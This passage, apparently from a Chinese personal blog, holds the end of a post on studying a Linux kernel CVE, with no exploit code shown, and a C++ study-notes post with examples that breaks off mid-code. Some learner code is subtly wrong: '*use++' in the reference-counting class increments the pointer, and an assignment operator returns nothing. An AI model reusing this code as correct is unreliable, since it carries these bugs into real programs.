<p>但比较奇怪的是一个进程只有线程的时候，就算使用这个文件描述符，文件描述符对应的<code>file</code>的引用计数还是没有变的。</p>
<p>这是支线程使用write正在写入时file的样子，可见f_count为2.</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221207011459177.png" alt="image-20221207011459177"></p>
<p>当开启了支线程但是没有使用文件描述符时<code>file</code>的样子，可见f_count为1</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221207011836162.png" alt="image-20221207011836162"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个cve的学习总算告一段落了，除了设置user namespace没怎么搞懂以外其他基本都明白了，也用exp调试打通了自己搭的环境，总的来说确实学到了好多。尤其是<code>cross cache</code>和<code>drity cred</code>，还深入的了解了文件描述符到底是个什么东东了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/c-study-tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/c-study-tips/" class="post-title-link" itemprop="url">c++ study tips</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-08 18:56:58 / 修改时间：20:40:35" itemprop="dateCreated datePublished" datetime="2023-02-08T18:56:58+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c-study-tips"><a href="#c-study-tips" class="headerlink" title="c++ study tips"></a>c++ study tips</h1><p>记录一些学习c++过程中的小问题或者有意思的点。</p>
<h2 id="互相引用"><a href="#互相引用" class="headerlink" title="互相引用"></a>互相引用</h2><p>A和B两个头文件互相引用在c++中会报错，因为可能会发生超前引用问题，超前引用是指使用了一个只声明了但没有定义的类型来声明一个变量，也就是还没有定义只声明了就使用它来创建变量，编译器是不会允许通过的。</p>
<p>解决办法就是在A的头文件中includeB，然后在A的.h文件中就能正常使用B了，但是在B的.h文件中不能includeA,只能声明一个class A,然后也不能声明一个A的对象比如<code>A a</code>,只能声明一个A的指针<code>A *a</code>。但是在B的.cpp文件中可以includeA来使用A的一些声明。</p>
<p>至于为什么可以声明指针但不能声明对象是因为此时对B来说A只声明了没有定义不知道A的大小所以没有办法确定A的大小，但是指针始终是8个字节可以确定，所以可以声明一个指针。</p>
<p>不得不说c++是真的饶啊。</p>
<h2 id="指针类"><a href="#指针类" class="headerlink" title="指针类"></a>指针类</h2><p>顾名思义就是某一个类的指针类，这个指针类并不是一个真的指针，而是会封装这个类的一些指针操作，然后通过这个指针类来操作这个类的数据会更加方便一些，比如容器和迭代器就是类和指针类。</p>
<h2 id="返回局部变量"><a href="#返回局部变量" class="headerlink" title="返回局部变量"></a>返回局部变量</h2><p>众所周知函数不能返回自己的局部变量的地址，但是比较我比较疑惑的是为什么可以返回一个局部对象，经过查阅得知当返回一个局部对象的时候并不是返回局部对象本身，而是将返回对象拷贝到函数调用点，所以返回的是一个副本，这个副本的作用域不是这个函数的，而是调用这个函数的函数的。</p>
<h2 id="智能指针初始化"><a href="#智能指针初始化" class="headerlink" title="智能指针初始化"></a>智能指针初始化</h2><p>默认初始化一个智能指针,然后使用程序就会报错，报错的原因是默认初始化的只能指针中保存着一个空指针，既然是空指针那就肯定不能使用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; word;</span><br><span class="line">    word-&gt;<span class="built_in">push_back</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> beg=word-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    cout&lt;&lt;*beg&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用make_shared进行初始化才可以使用，比如</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; word= make_shared&lt;vector&lt;string&gt;&gt;();</span><br><span class="line">    word-&gt;<span class="built_in">push_back</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> beg=word-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    cout&lt;&lt;*beg&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="非const引用与临时变量问题"><a href="#非const引用与临时变量问题" class="headerlink" title="非const引用与临时变量问题"></a>非const引用与临时变量问题</h2><p>首先得说明一下临时变量和局部变量的区别，局部变量指在函数内显示声明的变量称为局部变量，所以局部变量都是有变量名的，相对于的临时变量虽然也是函数内声明的变量但是这个变量没有变量名的，局部变量很容易理解，临时变量通常在函数参数传递发生类型转换以及函数返回值时被创建。</p>
<p>  当一个函数的形参为非const类型，而一个参数以非const传入，编译器一般会认为程序员会在该函数里修改该参数，而且该参数返回后还会发挥作用。此时如果你把一个临时变量当成非const引用传进来，由于临时变量的特殊性，程序员无法对改临时变量进行操作，同时临时变量可能随时会消失，修改临时变量也毫无意义，因此，临时变量不能作为非const引用。</p>
<p>比如下面的代码,uppercasify()函数的参数是string类型，但是传入的是char *类型，所以会把char *隐式转化成string变量，这个string变量就是临时变量，那uppercasify()函数内部如果对string操作的化也是对临时变量string进行操作而不是对subtleBookPlug变量进行操作，这样就会引起误操作了。所以不能使用非const引用接收临时变量，不仅没有意义还会引起误操作。</p>
<p>但是肯定非const引用可以接收局部变量的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uppercasify</span><span class="params">(<span class="built_in">string</span>&amp; str)</span> </span></span><br><span class="line"><span class="function"></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> subtleBookPlug[] = <span class="string">&quot;Effective C++&quot;</span>;</span><br><span class="line"></span><br><span class="line"> uppercasify(subtleBookPlug);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是那句话，c++真的饶。</p>
<h2 id="记录自己利用智能指针和标准库写的单词索引程序"><a href="#记录自己利用智能指针和标准库写的单词索引程序" class="headerlink" title="记录自己利用智能指针和标准库写的单词索引程序"></a>记录自己利用智能指针和标准库写的单词索引程序</h2><p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runQueries</span><span class="params">(fstream &amp;file)</span></span>&#123;</span><br><span class="line">    <span class="function">TextQuery <span class="title">textquery</span><span class="params">(file)</span></span>;</span><br><span class="line">    string user_string;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;plz input your word: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!(cin&gt;&gt;user_string)||user_string==<span class="string">&quot;quit&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        QueryResult qr=textquery.<span class="built_in">query</span>(user_string);</span><br><span class="line">        <span class="built_in">print</span>(cout,qr)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream file;</span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;./2.txt&quot;</span>,ios::in);</span><br><span class="line">    <span class="keyword">if</span>(!file)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;open file fail&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">runQueries</span>(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TextQuery.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_TEXTQUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_TEXTQUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;QueryResult.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextQuery</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TextQuery</span>(std::fstream &amp;);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getword</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">QueryResult <span class="title">query</span><span class="params">(<span class="keyword">const</span> std::string)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_context;</span><br><span class="line">    std::map&lt;std::string,std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;&gt; word;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_TEXTQUERY_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TextQuery.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TextQuery::<span class="built_in">TextQuery</span>(std::fstream &amp;file) &#123;</span><br><span class="line">    std::string tmp;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;file_context=std::make_shared&lt;std::vector&lt;std::string&gt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(std::<span class="built_in">getline</span>(file,tmp))&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;file_context-&gt;<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        <span class="function">std::istringstream <span class="title">line</span><span class="params">(tmp)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(line&gt;&gt;tmp)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;word.<span class="built_in">find</span>(tmp)==<span class="keyword">this</span>-&gt;word.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">auto</span> word_set= std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">                word_set-&gt;<span class="built_in">insert</span>(cur);</span><br><span class="line">                <span class="keyword">this</span>-&gt;word.<span class="built_in">insert</span>(&#123;tmp,word_set&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">auto</span> value=<span class="keyword">this</span>-&gt;word[tmp];</span><br><span class="line">                value-&gt;<span class="built_in">insert</span>(cur);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cur++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TextQuery::getword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> iter=<span class="keyword">this</span>-&gt;word.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span>(iter!=<span class="keyword">this</span>-&gt;word.<span class="built_in">end</span>())&#123;</span><br><span class="line">        std::cout&lt;&lt;iter-&gt;first&lt;&lt;<span class="string">&quot;  &quot;</span>;</span><br><span class="line">        <span class="keyword">auto</span> tmp=iter-&gt;second-&gt;<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">while</span>(tmp!=iter-&gt;second-&gt;<span class="built_in">end</span>())&#123;</span><br><span class="line">            std::cout&lt;&lt;*tmp&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            tmp++;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;std::endl;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">QueryResult <span class="title">TextQuery::query</span><span class="params">(std::string user_word)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> word_set=<span class="keyword">this</span>-&gt;word[user_word];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(user_word,word_set,<span class="keyword">this</span>-&gt;file_context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>QueryResult.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERYRESULT_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERYRESULT_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryResult</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream &amp;os, QueryResult &amp;qr)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string word;</span><br><span class="line">    std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt; word_set;</span><br><span class="line">    std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">QueryResult</span>(std::string word,std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt; word_set,std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_count)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;word=word;</span><br><span class="line">        <span class="keyword">this</span>-&gt;word_set=word_set;</span><br><span class="line">        <span class="keyword">this</span>-&gt;file_count=file_count;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERYRESULT_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>QueryResult.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;QueryResult.h&quot;</span></span></span><br><span class="line"><span class="function">std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream &amp;os,QueryResult &amp;qr)</span></span>&#123;</span><br><span class="line">    os&lt;&lt;qr.word&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;<span class="string">&quot;occurs &quot;</span>&lt;&lt;qr.word_set-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot; times&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">auto</span> iter=qr.word_set-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span>(iter!=qr.word_set-&gt;<span class="built_in">end</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> line_num=*iter+<span class="number">1</span>;</span><br><span class="line">        os&lt;&lt;<span class="string">&quot;(line &quot;</span>&lt;&lt;line_num&lt;&lt;<span class="string">&quot;)&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*qr.file_count)[*iter]&lt;&lt;std::endl;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体来说不是很难，主要记录一下这些标准库的主要用法。</p>
<h2 id="拷贝构造函数的参数问题"><a href="#拷贝构造函数的参数问题" class="headerlink" title="拷贝构造函数的参数问题"></a>拷贝构造函数的参数问题</h2><p>拷贝构造函数的参数只能这个类的对象的引用不能是一个对象，因为当拷贝构造函数形参是一个对象时，那发生拷贝的时候就会调用拷贝构造函数，而拷贝构造函数也会发生拷贝，所以又会调用拷贝构造函数，这就造成了死循环了。这个拷贝构造函数永远没有办法调用成功。</p>
<p>注意参数不仅是引用，如果要使用容器对对象进行存储的话，必须得存在一个const引用的构造函数，原因应该还是非const引用没办法接收临时变量。</p>
<p>所以拷贝构造函数最好有两个版本，一个const引用一个非const引用（我的理解）。</p>
<h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><p>编译器可以自动隐式的进行一步类型转换，但只能进行一步,比如下面代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="built_in">A</span>(string s);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(A a)</span></span>;</span><br></pre></td></tr></table></figure>

<p>如果这样<code>fun(&quot;123&quot;)</code>,就会发成错误，因为编译器只能自动隐式的进行一步类型转换，比如把字符串转换成string或者把string转换成class A,但是不能自动进行两步转化，<code>fun(&quot;123&quot;)</code>就是两步转化，正确的方式可以是这样<code>fun(string(&quot;123&quot;))</code>或者<code>fun(A(&quot;123&quot;))</code>。</p>
<p>这确实很方便，但是有时候程序员并不想进行这种自动转化，那就可以使用<strong>explicit</strong>进行限制，比如</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">A</span><span class="params">(string s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(A a)</span></span>;</span><br></pre></td></tr></table></figure>

<p>此时再调用<code>fun(string(&quot;123&quot;))</code>就会发生错误，因为禁止从string转化成class A了。</p>
<h2 id="拷贝初始化"><a href="#拷贝初始化" class="headerlink" title="拷贝初始化"></a>拷贝初始化</h2><p>拷贝初始化的时候会自动调用拷贝构造函数或者移动构造函数。</p>
<p>直接初始化和拷贝初始化还是有很大区别的，直接初始化指调用构造函数完成对象的初始化工作，拷贝初始化是指当对象发生拷贝的时候被动调用拷贝构造函数或者移动构造函数。</p>
<h2 id="拷贝构造函数和拷贝赋值运算符的区别"><a href="#拷贝构造函数和拷贝赋值运算符的区别" class="headerlink" title="拷贝构造函数和拷贝赋值运算符的区别"></a>拷贝构造函数和拷贝赋值运算符的区别</h2><p>主要区别就是他们调用的时机不同，比如</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line">    <span class="built_in">A</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;asd&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">A</span>(A &amp;a)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;123&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    A&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> A&amp;)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;234&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果这样</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    A c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那就是调用拷贝构造函数，输出123,那是因为此时是初始化一个对象的时候发生拷贝行为，就会调用拷贝构造函数</p>
<p>如果这样</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a,c;</span><br><span class="line">    c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单纯的把一个已经初始化的对象赋值给另一个已经初始化的对象就会调用拷贝赋值运算符。</p>
<p>所以为了一个类的健壮性，建议两者都得有。</p>
<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>c++太恐怖了，太多细节了。</p>
<h2 id="智能指针的简单实现"><a href="#智能指针的简单实现" class="headerlink" title="智能指针的简单实现"></a>智能指针的简单实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasPtr</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(HasPtr &amp;,HasPtr &amp;)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="keyword">int</span> i,<span class="keyword">const</span> string &amp;s= <span class="built_in">string</span>()):<span class="built_in">ptr</span>(<span class="keyword">new</span> <span class="built_in">string</span>(s)),<span class="built_in">i</span>(i),<span class="built_in">use</span>(<span class="keyword">new</span> <span class="built_in">size_t</span>(<span class="number">1</span>))&#123;&#125;;</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="keyword">const</span> HasPtr &amp;hasptr):<span class="built_in">ptr</span>(hasptr.ptr),<span class="built_in">i</span>(hasptr.i),<span class="built_in">use</span>(hasptr.use)&#123;</span><br><span class="line">        *use++;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">HasPtr</span>(HasPtr &amp;hasptr):<span class="built_in">ptr</span>(hasptr.ptr),<span 